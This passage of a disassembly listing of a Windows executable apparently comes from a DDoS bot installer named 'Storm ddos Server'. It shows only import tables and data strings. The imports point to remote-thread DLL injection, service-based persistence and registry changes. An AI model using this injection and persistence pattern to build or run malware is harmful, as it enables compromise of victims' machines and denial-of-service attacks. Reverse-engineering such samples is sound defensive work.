.rdata:0040340C dword_40340C    dd 8000039Ch            ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_MFC42↑o
.rdata:00403410                 dd 80000320h
.rdata:00403414                 dd 800003ADh
.rdata:00403418                 dd 80000217h
.rdata:0040341C                 dd 80000219h
.rdata:00403420                 dd 0
.rdata:00403424 ;
.rdata:00403424 ; Import names for MSVCP60.dll
.rdata:00403424 ;
.rdata:00403424 off_403424      dd rva word_403A5C      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_MSVCP60↑o
.rdata:00403428                 dd rva word_403A74
.rdata:0040342C                 dd rva word_403A3C
.rdata:00403430                 dd rva word_403A1C
.rdata:00403434                 dd 0
.rdata:00403438 ;
.rdata:00403438 ; Import names for MSVCRT.dll
.rdata:00403438 ;
.rdata:00403438 off_403438      dd rva word_403A0E      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_MSVCRT↑o
.rdata:0040343C                 dd rva word_4039FC
.rdata:00403440                 dd rva word_4038C4
.rdata:00403444                 dd rva word_4038D8
.rdata:00403448                 dd rva word_4038E4
.rdata:0040344C                 dd rva word_4038EC
.rdata:00403450                 dd rva word_4038F6
.rdata:00403454                 dd rva word_403900
.rdata:00403458                 dd rva word_403908
.rdata:0040345C                 dd rva word_403912
.rdata:00403460                 dd rva word_40391A
.rdata:00403464                 dd rva word_403922
.rdata:00403468                 dd rva word_40392A
.rdata:0040346C                 dd rva word_403932
.rdata:00403470                 dd rva word_40393C
.rdata:00403474                 dd rva word_403946
.rdata:00403478                 dd rva word_403966
.rdata:0040347C                 dd rva word_403974
.rdata:00403480                 dd rva word_40397E
.rdata:00403484                 dd rva word_403986
.rdata:00403488                 dd rva word_403994
.rdata:0040348C                 dd rva word_40399E
.rdata:00403490                 dd rva word_4039AE
.rdata:00403494                 dd rva word_4039BA
.rdata:00403498                 dd rva word_4039CE
.rdata:0040349C                 dd rva word_4039DE
.rdata:004034A0                 dd rva word_4039EE
.rdata:004034A4                 dd 0
.rdata:004034A8 ;
.rdata:004034A8 ; Import names for USER32.dll
.rdata:004034A8 ;
.rdata:004034A8 off_4034A8      dd rva word_40371A      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_USER32↑o
.rdata:004034AC                 dd 0
.rdata:004034B0 ;
.rdata:004034B0 ; Import names for comdlg32.dll
.rdata:004034B0 ;
.rdata:004034B0 off_4034B0      dd rva word_403734      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_comdlg32↑o
.rdata:004034B4                 dd 0
.rdata:004034B8 ;
.rdata:004034B8 ; Import names for ole32.dll
.rdata:004034B8 ;
.rdata:004034B8 off_4034B8      dd rva word_40387E      ; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_ole32↑o
.rdata:004034BC                 dd rva word_403890
.rdata:004034C0                 dd rva word_4038A0
.rdata:004034C4                 dd 0
.rdata:004034C8 word_4034C8     dw 1B9h                 ; DATA XREF: .rdata:00403400↑o
.rdata:004034CA                 db 'GetSystemDirectoryA',0
.rdata:004034DE word_4034DE     dw 1C2h                 ; DATA XREF: .rdata:004033FC↑o
.rdata:004034E0                 db 'GetSystemWindowsDirectoryA',0
.rdata:004034FB                 align 4
.rdata:004034FC word_4034FC     dw 64h                  ; DATA XREF: .rdata:004033F8↑o
.rdata:004034FE                 db 'CreateRemoteThread',0
.rdata:00403511                 align 2
.rdata:00403512 word_403512     dw 198h                 ; DATA XREF: .rdata:004033F4↑o
.rdata:00403514                 db 'GetProcAddress',0
.rdata:00403523                 align 4
.rdata:00403524 word_403524     dw 177h                 ; DATA XREF: .rdata:004033F0↑o
.rdata:00403526                 db 'GetModuleHandleA',0
.rdata:00403537                 align 4
.rdata:00403538 word_403538     dw 3A0h                 ; DATA XREF: .rdata:004033EC↑o
.rdata:0040353A                 db 'WriteProcessMemory',0
.rdata:0040354D                 align 2
.rdata:0040354E word_40354E     dw 376h                 ; DATA XREF: .rdata:004033E8↑o
.rdata:00403550                 db 'VirtualAllocEx',0
.rdata:0040355F                 align 10h
.rdata:00403560 word_403560     dw 3BFh                 ; DATA XREF: .rdata:004033E4↑o
.rdata:00403562                 db 'lstrlenA',0
.rdata:0040356B                 align 4
.rdata:0040356C word_40356C     dw 60h                  ; DATA XREF: .rdata:004033E0↑o
.rdata:0040356E                 db 'CreateProcessA',0
.rdata:0040357D                 align 2
.rdata:0040357E word_40357E     dw 1AFh                 ; DATA XREF: .rdata:004033DC↑o
.rdata:00403580                 db 'GetStartupInfoA',0
.rdata:00403590 word_403590     dw 349h                 ; DATA XREF: .rdata:004033D8↑o
.rdata:00403592                 db 'Sleep',0
.rdata:00403598 word_403598     dw 2C7h                 ; DATA XREF: .rdata:004033D4↑o
.rdata:0040359A                 db 'ResumeThread',0
.rdata:004035A7                 align 4
.rdata:004035A8 word_4035A8     dw 338h                 ; DATA XREF: .rdata:004033D0↑o
.rdata:004035AA                 db 'SetThreadPriority',0
.rdata:004035BC word_4035BC     dw 13Dh                 ; DATA XREF: .rdata:004033CC↑o
.rdata:004035BE                 db 'GetCurrentThread',0
.rdata:004035CF                 align 10h
.rdata:004035D0 word_4035D0     dw 326h                 ; DATA XREF: .rdata:004033C8↑o
.rdata:004035D2                 db 'SetPriorityClass',0
.rdata:004035E3                 align 4
.rdata:004035E4 word_4035E4     dw 13Ah                 ; DATA XREF: .rdata:004033A8↑o
.rdata:004035E6                 db 'GetCurrentProcess',0
.rdata:004035F8 word_4035F8     dw 3B0h                 ; DATA XREF: .rdata:off_403384↑o
.rdata:004035FA                 db 'lstrcatA',0
.rdata:00403603                 align 4
.rdata:00403604 word_403604     dw 3B9h                 ; DATA XREF: .rdata:00403388↑o
.rdata:00403606                 db 'lstrcpyA',0
.rdata:0040360F                 align 10h
.rdata:00403610 word_403610     dw 150h                 ; DATA XREF: .rdata:0040338C↑o
.rdata:00403612                 db 'GetEnvironmentVariableA',0
.rdata:0040362A word_40362A     dw 1ADh                 ; DATA XREF: .rdata:00403390↑o
.rdata:0040362C                 db 'GetShortPathNameA',0
.rdata:0040363E word_40363E     dw 175h                 ; DATA XREF: .rdata:00403394↑o
.rdata:00403640                 db 'GetModuleFileNameA',0
.rdata:00403653                 align 4
.rdata:00403654 word_403654     dw 169h                 ; DATA XREF: .rdata:00403398↑o
.rdata:00403656                 db 'GetLastError',0
.rdata:00403663                 align 4
.rdata:00403664 word_403664     dw 30Eh                 ; DATA XREF: .rdata:0040339C↑o
.rdata:00403666                 db 'SetFileAttributesA',0
.rdata:00403679                 align 2
.rdata:0040367A word_40367A     dw 3Dh                  ; DATA XREF: .rdata:004033A0↑o
.rdata:0040367C                 db 'CopyFileA',0
.rdata:00403686 word_403686     dw 2Eh                  ; DATA XREF: .rdata:004033A4↑o
.rdata:00403688                 db 'CloseHandle',0
.rdata:00403694 word_403694     dw 397h                 ; DATA XREF: .rdata:00403404↑o
.rdata:00403696                 db 'WriteFile',0
.rdata:004036A0 word_4036A0     dw 4Dh                  ; DATA XREF: .rdata:004033AC↑o
.rdata:004036A2                 db 'CreateFileA',0
.rdata:004036AE word_4036AE     dw 1F5h                 ; DATA XREF: .rdata:004033B0↑o
.rdata:004036B0                 db 'GlobalFree',0
.rdata:004036BB                 align 4
.rdata:004036BC word_4036BC     dw 25Bh                 ; DATA XREF: .rdata:004033B4↑o
.rdata:004036BE                 db 'LockResource',0
.rdata:004036CB                 align 4
.rdata:004036CC word_4036CC     dw 1EEh                 ; DATA XREF: .rdata:004033B8↑o
.rdata:004036CE                 db 'GlobalAlloc',0
.rdata:004036DA word_4036DA     dw 24Dh                 ; DATA XREF: .rdata:004033BC↑o
.rdata:004036DC                 db 'LoadResource',0
.rdata:004036E9                 align 2
.rdata:004036EA word_4036EA     dw 348h                 ; DATA XREF: .rdata:004033C0↑o
.rdata:004036EC                 db 'SizeofResource',0
.rdata:004036FB                 align 4
.rdata:004036FC word_4036FC     dw 0DAh                 ; DATA XREF: .rdata:004033C4↑o
.rdata:004036FE                 db 'FindResourceA',0
.rdata:0040370C aKernel32Dll    db 'KERNEL32.dll',0     ; DATA XREF: .rdata:0040329C↑o
.rdata:00403719                 align 2
.rdata:0040371A word_40371A     dw 1DEh                 ; DATA XREF: .rdata:off_4034A8↑o
.rdata:0040371C                 db 'MessageBoxA',0
.rdata:00403728 aUser32Dll      db 'USER32.dll',0       ; DATA XREF: .rdata:004032B0↑o
.rdata:00403733                 align 4
.rdata:00403734 word_403734     dw 7                    ; DATA XREF: .rdata:off_4034B0↑o
.rdata:00403736                 db 'GetFileTitleA',0
.rdata:00403744 aComdlg32Dll    db 'comdlg32.dll',0     ; DATA XREF: .rdata:004032C4↑o
.rdata:00403751                 align 2
.rdata:00403752 word_403752     dw 1C9h                 ; DATA XREF: .rdata:0040336C↑o
.rdata:00403754                 db 'RegCloseKey',0
.rdata:00403760 word_403760     dw 1F9h                 ; DATA XREF: .rdata:00403368↑o
.rdata:00403762                 db 'RegSetValueExA',0
.rdata:00403771                 align 2
.rdata:00403772 word_403772     dw 1D2h                 ; DATA XREF: .rdata:00403364↑o
.rdata:00403774                 db 'RegDeleteValueA',0
.rdata:00403784 word_403784     dw 1E1h                 ; DATA XREF: .rdata:00403360↑o
.rdata:00403786                 db 'RegOpenKeyA',0
.rdata:00403792 word_403792     dw 239h                 ; DATA XREF: .rdata:0040335C↑o
.rdata:00403794                 db 'SetServiceStatus',0
.rdata:004037A5                 align 2
.rdata:004037A6 word_4037A6     dw 201h                 ; DATA XREF: .rdata:00403358↑o
.rdata:004037A8                 db 'RegisterServiceCtrlHandlerA',0
.rdata:004037C4 word_4037C4     dw 1CCh                 ; DATA XREF: .rdata:00403354↑o
.rdata:004037C6                 db 'RegCreateKeyA',0
.rdata:004037D4 word_4037D4     dw 23Fh                 ; DATA XREF: .rdata:00403350↑o
.rdata:004037D6                 db 'StartServiceCtrlDispatcherA',0
.rdata:004037F2 word_4037F2     dw 1ECh                 ; DATA XREF: .rdata:0040334C↑o
.rdata:004037F4                 db 'RegQueryValueExA',0
.rdata:00403805                 align 2
.rdata:00403806 word_403806     dw 1E2h                 ; DATA XREF: .rdata:00403348↑o
.rdata:00403808                 db 'RegOpenKeyExA',0
.rdata:00403816 word_403816     dw 3Eh                  ; DATA XREF: .rdata:off_403344↑o
.rdata:00403818                 db 'CloseServiceHandle',0
.rdata:0040382B                 align 4
.rdata:0040382C word_40382C     dw 23Eh                 ; DATA XREF: .rdata:0040337C↑o
.rdata:0040382E                 db 'StartServiceA',0
.rdata:0040383C word_40383C     dw 1ADh                 ; DATA XREF: .rdata:00403370↑o
.rdata:0040383E                 db 'OpenServiceA',0
.rdata:0040384B                 align 4
.rdata:0040384C word_40384C     dw 64h                  ; DATA XREF: .rdata:00403374↑o
.rdata:0040384E                 db 'CreateServiceA',0
.rdata:0040385D                 align 2
.rdata:0040385E word_40385E     dw 1ABh                 ; DATA XREF: .rdata:00403378↑o
.rdata:00403860                 db 'OpenSCManagerA',0
.rdata:0040386F                 align 10h
.rdata:00403870 aAdvapi32Dll    db 'ADVAPI32.dll',0     ; DATA XREF: .rdata:004032D8↑o
.rdata:0040387D                 align 2
.rdata:0040387E word_40387E     dw 68h                  ; DATA XREF: .rdata:off_4034B8↑o
.rdata:00403880                 db 'CoUninitialize',0
.rdata:0040388F                 align 10h
.rdata:00403890 word_403890     dw 0Fh                  ; DATA XREF: .rdata:004034BC↑o
.rdata:00403892                 db 'CoCreateGuid',0
.rdata:0040389F                 align 10h
.rdata:004038A0 word_4038A0     dw 3Ah                  ; DATA XREF: .rdata:004034C0↑o
.rdata:004038A2                 db 'CoInitialize',0
.rdata:004038AF                 align 10h
.rdata:004038B0 aOle32Dll       db 'ole32.dll',0        ; DATA XREF: .rdata:004032EC↑o
.rdata:004038BA aMfc42Dll       db 'MFC42.DLL',0        ; DATA XREF: .rdata:00403300↑o
.rdata:004038C4 word_4038C4     dw 49h                  ; DATA XREF: .rdata:00403440↑o
.rdata:004038C6                 db '__CxxFrameHandler',0
.rdata:004038D8 word_4038D8     dw 1AEh                 ; DATA XREF: .rdata:00403444↑o
.rdata:004038DA                 db '_snprintf',0
.rdata:004038E4 word_4038E4     dw 25Eh                 ; DATA XREF: .rdata:00403448↑o
.rdata:004038E6                 db 'free',0
.rdata:004038EB                 align 4
.rdata:004038EC word_4038EC     dw 266h                 ; DATA XREF: .rdata:0040344C↑o
.rdata:004038EE                 db 'fwrite',0
.rdata:004038F5                 align 2
.rdata:004038F6 word_4038F6     dw 24Ch                 ; DATA XREF: .rdata:00403450↑o
.rdata:004038F8                 db 'fclose',0
.rdata:004038FF                 align 10h
.rdata:00403900 word_403900     dw 25Dh                 ; DATA XREF: .rdata:00403454↑o
.rdata:00403902                 db 'fread',0
.rdata:00403908 word_403908     dw 291h                 ; DATA XREF: .rdata:00403458↑o
.rdata:0040390A                 db 'malloc',0
.rdata:00403911                 align 2
.rdata:00403912 word_403912     dw 264h                 ; DATA XREF: .rdata:0040345C↑o
.rdata:00403914                 db 'ftell',0
.rdata:0040391A word_40391A     dw 262h                 ; DATA XREF: .rdata:00403460↑o
.rdata:0040391C                 db 'fseek',0
.rdata:00403922 word_403922     dw 257h                 ; DATA XREF: .rdata:00403464↑o
.rdata:00403924                 db 'fopen',0
.rdata:0040392A word_40392A     dw 249h                 ; DATA XREF: .rdata:00403468↑o
.rdata:0040392C                 db 'exit',0
.rdata:00403931                 align 2
.rdata:00403932 word_403932     dw 2C5h                 ; DATA XREF: .rdata:0040346C↑o
.rdata:00403934                 db 'strstr',0
.rdata:0040393B                 align 4
.rdata:0040393C word_40393C     dw 2C0h                 ; DATA XREF: .rdata:00403470↑o
.rdata:0040393E                 db 'strncmp',0
.rdata:00403946 word_403946     dw 0CAh                 ; DATA XREF: .rdata:00403474↑o
.rdata:00403948                 db '_except_handler3',0
.rdata:00403959                 align 2
.rdata:0040395A aMsvcrtDll      db 'MSVCRT.dll',0       ; DATA XREF: .rdata:00403314↑o
.rdata:00403965                 align 2
.rdata:00403966 word_403966     dw 55h                  ; DATA XREF: .rdata:00403478↑o
.rdata:00403968                 db '__dllonexit',0
.rdata:00403974 word_403974     dw 186h                 ; DATA XREF: .rdata:0040347C↑o
.rdata:00403976                 db '_onexit',0
.rdata:0040397E word_40397E     dw 0D3h                 ; DATA XREF: .rdata:00403480↑o
.rdata:00403980                 db '_exit',0
.rdata:00403986 word_403986     dw 48h                  ; DATA XREF: .rdata:00403484↑o
.rdata:00403988                 db '_XcptFilter',0
.rdata:00403994 word_403994     dw 8Fh                  ; DATA XREF: .rdata:00403488↑o
.rdata:00403996                 db '_acmdln',0
.rdata:0040399E word_40399E     dw 58h                  ; DATA XREF: .rdata:0040348C↑o
.rdata:004039A0                 db '__getmainargs',0
.rdata:004039AE word_4039AE     dw 10Fh                 ; DATA XREF: .rdata:00403490↑o
.rdata:004039B0                 db '_initterm',0
.rdata:004039BA word_4039BA     dw 83h                  ; DATA XREF: .rdata:00403494↑o
.rdata:004039BC                 db '__setusermatherr',0
.rdata:004039CD                 align 2
.rdata:004039CE word_4039CE     dw 9Dh                  ; DATA XREF: .rdata:00403498↑o
.rdata:004039D0                 db '_adjust_fdiv',0
.rdata:004039DD                 align 2
.rdata:004039DE word_4039DE     dw 6Ah                  ; DATA XREF: .rdata:0040349C↑o
.rdata:004039E0                 db '__p__commode',0
.rdata:004039ED                 align 2
.rdata:004039EE word_4039EE     dw 6Fh                  ; DATA XREF: .rdata:004034A0↑o
.rdata:004039F0                 db '__p__fmode',0
.rdata:004039FB                 align 4
.rdata:004039FC word_4039FC     dw 81h                  ; DATA XREF: .rdata:0040343C↑o
.rdata:004039FE                 db '__set_app_type',0
.rdata:00403A0D                 align 2
.rdata:00403A0E word_403A0E     dw 0B7h                 ; DATA XREF: .rdata:off_403438↑o
.rdata:00403A10                 db '_controlfp',0
.rdata:00403A1B                 align 4
.rdata:00403A1C word_403A1C     dw 9Eh                  ; DATA XREF: .rdata:00403430↑o
.rdata:00403A1E                 db '??0Init@ios_base@std@@QAE@XZ',0
.rdata:00403A3B                 align 4
.rdata:00403A3C word_403A3C     dw 109h                 ; DATA XREF: .rdata:0040342C↑o
.rdata:00403A3E                 db '??1Init@ios_base@std@@QAE@XZ',0
.rdata:00403A5B                 align 4
.rdata:00403A5C word_403A5C     dw 0A5h                 ; DATA XREF: .rdata:off_403424↑o
.rdata:00403A5E                 db '??0_Winit@std@@QAE@XZ',0
.rdata:00403A74 word_403A74     dw 10Dh                 ; DATA XREF: .rdata:00403428↑o
.rdata:00403A76                 db '??1_Winit@std@@QAE@XZ',0
.rdata:00403A8C aMsvcp60Dll     db 'MSVCP60.dll',0      ; DATA XREF: .rdata:00403328↑o
.rdata:00403A98                 align 800h
.rdata:00403A98 _rdata          ends
.rdata:00403A98
.data:00404000 ; Section 3. (virtual address 00004000)
.data:00404000 ; Virtual size                  : 00000520 (   1312.)
.data:00404000 ; Section size in file          : 00001000 (   4096.)
.data:00404000 ; Offset to raw data for section: 00004000
.data:00404000 ; Flags C0000040: Data Readable Writable
.data:00404000 ; Alignment     : default
.data:00404000 ; ===========================================================================
.data:00404000
.data:00404000 ; Segment type: Pure data
.data:00404000 ; Segment permissions: Read/Write
.data:00404000 _data           segment para public 'DATA' use32
.data:00404000                 assume cs:_data
.data:00404000                 ;org 404000h
.data:00404000 ; _PVFV dword_404000
.data:00404000 dword_404000    dd 0                    ; DATA XREF: start+C0↑o
.data:00404004                 dd offset sub_402580
.data:00404008                 dd offset sub_4025C0
.data:0040400C ; _PVFV dword_40400C
.data:0040400C dword_40400C    dd 0                    ; DATA XREF: start+BB↑o
.data:00404010 ; _PVFV First
.data:00404010 First           dd 0                    ; DATA XREF: start+8D↑o
.data:00404014 ; _PVFV Last
.data:00404014 Last            dd 0                    ; DATA XREF: start+88↑o
.data:00404018                 align 10h
.data:00404020 aStormserverDll db 'StormServer.dll',0  ; DATA XREF: sub_401260+2F↑o
.data:00404020                                         ; sub_401510+B5↑o ...
.data:00404030                 db    0
.data:00404031                 db    0
.data:00404032                 db    0
.data:00404033                 db    0
.data:00404034                 db    0
.data:00404035                 db    0
.data:00404036                 db    0
.data:00404037                 db    0
.data:00404038                 db    0
.data:00404039                 db    0
.data:0040403A                 db    0
.data:0040403B                 db    0
.data:0040403C                 db    0
.data:0040403D                 db    0
.data:0040403E                 db    0
.data:0040403F                 db    0
.data:00404040                 db    0
.data:00404041                 db    0
.data:00404042                 db    0
.data:00404043                 db    0
.data:00404044                 db    0
.data:00404045                 db    0
.data:00404046                 db    0
.data:00404047                 db    0
.data:00404048                 db    0
.data:00404049                 db    0
.data:0040404A                 db    0
.data:0040404B                 db    0
.data:0040404C                 db    0
.data:0040404D                 db    0
.data:0040404E                 db    0
.data:0040404F                 db    0
.data:00404050                 db    0
.data:00404051                 db    0
.data:00404052                 db    0
.data:00404053                 db    0
.data:00404054                 db    0
.data:00404055                 db    0
.data:00404056                 db    0
.data:00404057                 db    0
.data:00404058                 db    0
.data:00404059                 db    0
.data:0040405A                 db    0
.data:0040405B                 db    0
.data:0040405C                 db    0
.data:0040405D                 db    0
.data:0040405E                 db    0
.data:0040405F                 db    0
.data:00404060                 db    0
.data:00404061                 db    0
.data:00404062                 db    0
.data:00404063                 db    0
.data:00404064                 db    0
.data:00404065                 db    0
.data:00404066                 db    0
.data:00404067                 db    0
.data:00404068                 db    0
.data:00404069                 db    0
.data:0040406A                 db    0
.data:0040406B                 db    0
.data:0040406C                 db    0
.data:0040406D                 db    0
.data:0040406E                 db    0
.data:0040406F                 db    0
.data:00404070                 db    0
.data:00404071                 db    0
.data:00404072                 db    0
.data:00404073                 db    0
.data:00404074                 db    0
.data:00404075                 db    0
.data:00404076                 db    0
.data:00404077                 db    0
.data:00404078                 db    0
.data:00404079                 db    0
.data:0040407A                 db    0
.data:0040407B                 db    0
.data:0040407C                 db    0
.data:0040407D                 db    0
.data:0040407E                 db    0
.data:0040407F                 db    0
.data:00404080                 db    0
.data:00404081                 db    0
.data:00404082                 db    0
.data:00404083                 db    0
.data:00404084                 db    0
.data:00404085                 db    0
.data:00404086                 db    0
.data:00404087                 db    0
.data:00404088                 db    0
.data:00404089                 db    0
.data:0040408A                 db    0
.data:0040408B                 db    0
.data:0040408C                 db    0
.data:0040408D                 db    0
.data:0040408E                 db    0
.data:0040408F                 db    0
.data:00404090                 db    0
.data:00404091                 db    0
.data:00404092                 db    0
.data:00404093                 db    0
.data:00404094                 db    0
.data:00404095                 db    0
.data:00404096                 db    0
.data:00404097                 db    0
.data:00404098                 db    0
.data:00404099                 db    0
.data:0040409A                 db    0
.data:0040409B                 db    0
.data:0040409C                 db    0
.data:0040409D                 db    0
.data:0040409E                 db    0
.data:0040409F                 db    0
.data:004040A0                 db    0
.data:004040A1                 db    0
.data:004040A2                 db    0
.data:004040A3                 db    0
.data:004040A4                 db    0
.data:004040A5                 db    0
.data:004040A6                 db    0
.data:004040A7                 db    0
.data:004040A8                 db    0
.data:004040A9                 db    0
.data:004040AA                 db    0
.data:004040AB                 db    0
.data:004040AC                 db    0
.data:004040AD                 db    0
.data:004040AE                 db    0
.data:004040AF                 db    0
.data:004040B0                 db    0
.data:004040B1                 db    0
.data:004040B2                 db    0
.data:004040B3                 db    0
.data:004040B4                 db    0
.data:004040B5                 db    0
.data:004040B6                 db    0
.data:004040B7                 db    0
.data:004040B8                 db    0
.data:004040B9                 db    0
.data:004040BA                 db    0
.data:004040BB                 db    0
.data:004040BC                 db    0
.data:004040BD                 db    0
.data:004040BE                 db    0
.data:004040BF                 db    0
.data:004040C0                 db    0
.data:004040C1                 db    0
.data:004040C2                 db    0
.data:004040C3                 db    0
.data:004040C4                 db    0
.data:004040C5                 db    0
.data:004040C6                 db    0
.data:004040C7                 db    0
.data:004040C8                 db    0
.data:004040C9                 db    0
.data:004040CA                 db    0
.data:004040CB                 db    0
.data:004040CC                 db    0
.data:004040CD                 db    0
.data:004040CE                 db    0
.data:004040CF                 db    0
.data:004040D0                 db    0
.data:004040D1                 db    0
.data:004040D2                 db    0
.data:004040D3                 db    0
.data:004040D4                 db    0
.data:004040D5                 db    0
.data:004040D6                 db    0
.data:004040D7                 db    0
.data:004040D8                 db    0
.data:004040D9                 db    0
.data:004040DA                 db    0
.data:004040DB                 db    0
.data:004040DC                 db    0
.data:004040DD                 db    0
.data:004040DE                 db    0
.data:004040DF                 db    0
.data:004040E0                 db    0
.data:004040E1                 db    0
.data:004040E2                 db    0
.data:004040E3                 db    0
.data:004040E4                 db    0
.data:004040E5                 db    0
.data:004040E6                 db    0
.data:004040E7                 db    0
.data:004040E8                 db    0
.data:004040E9                 db    0
.data:004040EA                 db    0
.data:004040EB                 db    0
.data:004040EC                 db    0
.data:004040ED                 db    0
.data:004040EE                 db    0
.data:004040EF                 db    0
.data:004040F0                 db    0
.data:004040F1                 db    0
.data:004040F2                 db    0
.data:004040F3                 db    0
.data:004040F4                 db    0
.data:004040F5                 db    0
.data:004040F6                 db    0
.data:004040F7                 db    0
.data:004040F8                 db    0
.data:004040F9                 db    0
.data:004040FA                 db    0
.data:004040FB                 db    0
.data:004040FC                 db    0
.data:004040FD                 db    0
.data:004040FE                 db    0
.data:004040FF                 db    0
.data:00404100                 db    0
.data:00404101                 db    0
.data:00404102                 db    0
.data:00404103                 db    0
.data:00404104                 db    0
.data:00404105                 db    0
.data:00404106                 db    0
.data:00404107                 db    0
.data:00404108                 db    0
.data:00404109                 db    0
.data:0040410A                 db    0
.data:0040410B                 db    0
.data:0040410C                 db    0
.data:0040410D                 db    0
.data:0040410E                 db    0
.data:0040410F                 db    0
.data:00404110                 db    0
.data:00404111                 db    0
.data:00404112                 db    0
.data:00404113                 db    0
.data:00404114                 db    0
.data:00404115                 db    0
.data:00404116                 db    0
.data:00404117                 db    0
.data:00404118                 db    0
.data:00404119                 db    0
.data:0040411A                 db    0
.data:0040411B                 db    0
.data:0040411C                 db    0
.data:0040411D                 db    0
.data:0040411E                 db    0
.data:0040411F                 db    0
.data:00404120 dword_404120    dd 3                    ; DATA XREF: WinMain(x,x,x,x)+1F↑r
.data:00404120                                         ; WinMain(x,x,x,x)+243↑r
.data:00404124 byte_404124     db 0                    ; DATA XREF: sub_401510+A4↑r
.data:00404124                                         ; sub_401510+12A↑r ...
.data:00404125 byte_404125     db 0                    ; DATA XREF: sub_4010C0+16↑r
.data:00404126                 align 4
.data:00404128 ; CHAR ServiceName[]
.data:00404128 ServiceName     db 'Storm ddos Server',0
.data:00404128                                         ; DATA XREF: sub_401510+24↑o
.data:00404128                                         ; WinMain(x,x,x,x)+260↑o ...
.data:0040413A                 db    0
.data:0040413B                 db    0
.data:0040413C                 db    0
.data:0040413D                 db    0
.data:0040413E                 db    0
.data:0040413F                 db    0
.data:00404140                 db    0
.data:00404141                 db    0
.data:00404142                 db    0
.data:00404143                 db    0
.data:00404144                 db    0
.data:00404145                 db    0
.data:00404146                 db    0
.data:00404147                 db    0
.data:00404148 ; CHAR DisplayName[]
.data:00404148 DisplayName     db 'Welcome to use storm ddos',0
.data:00404148                                         ; DATA XREF: WinMain(x,x,x,x)+29D↑o
.data:00404162                 db    0
.data:00404163                 db    0
.data:00404164                 db    0
.data:00404165                 db    0
.data:00404166                 db    0
.data:00404167                 db    0
.data:00404168                 db    0
.data:00404169                 db    0
.data:0040416A                 db    0
.data:0040416B                 db    0
.data:0040416C                 db    0
.data:0040416D                 db    0
.data:0040416E                 db    0
.data:0040416F                 db    0
.data:00404170                 db    0
.data:00404171                 db    0
.data:00404172                 db    0
.data:00404173                 db    0
.data:00404174                 db    0
.data:00404175                 db    0
.data:00404176                 db    0
.data:00404177                 db    0
.data:00404178                 db    0
.data:00404179                 db    0
.data:0040417A                 db    0
.data:0040417B                 db    0
.data:0040417C                 db    0
.data:0040417D                 db    0
.data:0040417E                 db    0
.data:0040417F                 db    0
.data:00404180                 db    0
.data:00404181                 db    0
.data:00404182                 db    0
.data:00404183                 db    0
.data:00404184                 db    0
.data:00404185                 db    0
.data:00404186                 db    0
.data:00404187                 db    0
.data:00404188                 db    0
.data:00404189                 db    0
.data:0040418A                 db    0
.data:0040418B                 db    0
.data:0040418C                 db    0
.data:0040418D                 db    0
.data:0040418E                 db    0
.data:0040418F                 db    0
.data:00404190                 db    0
.data:00404191                 db    0
.data:00404192                 db    0
.data:00404193                 db    0
.data:00404194                 db    0
.data:00404195                 db    0
.data:00404196                 db    0
.data:00404197                 db    0
.data:00404198                 db    0
.data:00404199                 db    0
.data:0040419A                 db    0
.data:0040419B                 db    0
.data:0040419C                 db    0
.data:0040419D                 db    0
.data:0040419E                 db    0
.data:0040419F                 db    0
.data:004041A0                 db    0
.data:004041A1                 db    0
.data:004041A2                 db    0
.data:004041A3                 db    0
.data:004041A4                 db    0
.data:004041A5                 db    0
.data:004041A6                 db    0
.data:004041A7                 db    0
.data:004041A8                 db    0
.data:004041A9                 db    0
.data:004041AA                 db    0
.data:004041AB                 db    0
.data:004041AC                 db    0
.data:004041AD                 db    0
.data:004041AE                 db    0
.data:004041AF                 db    0
.data:004041B0                 db    0
.data:004041B1                 db    0
.data:004041B2                 db    0
.data:004041B3                 db    0
.data:004041B4                 db    0
.data:004041B5                 db    0
.data:004041B6                 db    0
.data:004041B7                 db    0
.data:004041B8                 db    0
.data:004041B9                 db    0
.data:004041BA                 db    0
.data:004041BB                 db    0
.data:004041BC                 db    0
.data:004041BD                 db    0
.data:004041BE                 db    0
.data:004041BF                 db    0
.data:004041C0                 db    0
.data:004041C1                 db    0
.data:004041C2                 db    0
.data:004041C3                 db    0
.data:004041C4                 db    0
.data:004041C5                 db    0
.data:004041C6                 db    0
.data:004041C7                 db    0
.data:004041C8 ; CHAR String[]
.data:004041C8 String          db 'Thank you',0        ; DATA XREF: WinMain(x,x,x,x):loc_401F48↑o
.data:004041D2                 db    0
.data:004041D3                 db    0
.data:004041D4                 db    0
.data:004041D5                 db    0
.data:004041D6                 db    0
.data:004041D7                 db    0
.data:004041D8                 db    0
.data:004041D9                 db    0
.data:004041DA                 db    0
.data:004041DB                 db    0
.data:004041DC                 db    0
.data:004041DD                 db    0
.data:004041DE                 db    0
.data:004041DF                 db    0
.data:004041E0                 db    0
.data:004041E1                 db    0
.data:004041E2                 db    0
.data:004041E3                 db    0
.data:004041E4                 db    0
.data:004041E5                 db    0
.data:004041E6                 db    0
.data:004041E7                 db    0
.data:004041E8                 db    0
.data:004041E9                 db    0
.data:004041EA                 db    0
.data:004041EB                 db    0
.data:004041EC                 db    0
.data:004041ED                 db    0
.data:004041EE                 db    0
.data:004041EF                 db    0
.data:004041F0                 db    0
.data:004041F1                 db    0
.data:004041F2                 db    0
.data:004041F3                 db    0
.data:004041F4                 db    0
.data:004041F5                 db    0
.data:004041F6                 db    0
.data:004041F7                 db    0
.data:004041F8                 db    0
.data:004041F9                 db    0
.data:004041FA                 db    0
.data:004041FB                 db    0
.data:004041FC                 db    0
.data:004041FD                 db    0
.data:004041FE                 db    0
.data:004041FF                 db    0
.data:00404200                 db    0
.data:00404201                 db    0
.data:00404202                 db    0
.data:00404203                 db    0
.data:00404204                 db    0
.data:00404205                 db    0
.data:00404206                 db    0
.data:00404207                 db    0
.data:00404208                 db    0
.data:00404209                 db    0
.data:0040420A                 db    0
.data:0040420B                 db    0
.data:0040420C                 db    0
.data:0040420D                 db    0
.data:0040420E                 db    0
.data:0040420F                 db    0
.data:00404210                 db    0
.data:00404211                 db    0
.data:00404212                 db    0
.data:00404213                 db    0
.data:00404214                 db    0
.data:00404215                 db    0
.data:00404216                 db    0
.data:00404217                 db    0
.data:00404218                 db    0
.data:00404219                 db    0
.data:0040421A                 db    0
.data:0040421B                 db    0
.data:0040421C                 db    0
.data:0040421D                 db    0
.data:0040421E                 db    0
